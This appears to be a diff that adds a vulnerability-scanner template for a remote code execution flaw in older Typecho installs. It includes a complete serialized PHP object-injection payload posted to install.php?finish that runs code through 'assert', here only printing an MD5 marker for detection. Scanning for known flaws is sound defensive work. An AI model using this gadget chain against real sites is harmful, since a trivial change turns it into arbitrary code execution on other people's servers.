@@ -1,0 +1,34 @@
+id: typecho-install-php-rce
+info:
+  name: Typecho Install PHP RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a Remote Code Execution (RCE) vulnerability in Typecho versions below 1.1(17.10.24).
+    Utilizes the `install.php?finish` endpoint to inject and execute arbitrary PHP code.
+  reference:
+    - https://www.freebuf.com/vuls/155753.html
+    - https://www.freebuf.com/vuls/152058.html
+
+variables:
+  random_str: "{{rand_text_alpha(4)}}"
+  payload: |
+    a:2:{s:7:"adapter";O:12:"Typecho_Feed":2:{s:19:"\u0000Typecho_Feed\u0000_type";s:8:"ATOM 1.0";s:20:"\u0000Typecho_Feed\u0000_items";a:1:{i:0;a:2:{s:8:"category";a:1:{i:0;O:15:"Typecho_Request":2:{s:24:"\u0000Typecho_Request\u0000_params";a:1:{s:10:"screenName";s:18:"print(md5(\'" + random_str + "\'))";}s:24:"\u0000Typecho_Request\u0000_filter";a:1:{i:0;s:6:"assert";}}}s:6:"author";O:15:"Typecho_Request":2:{s:24:"\u0000Typecho_Request\u0000_params";a:1:{s:10:"screenName";s:18:"print(md5(\'" + random_str + "\'))";}s:24:"\u0000Typecho_Request\u0000_filter";a:1:{i:0;s:6:"assert";}}}}s:6:"prefix";s:8:"typecho_";}}
+
+http:
+  - raw:
+      - |
+        POST /install.php?finish HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}
+
+        __typecho_config={{base64_encode(payload)}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "{{md5(random_str)}}"
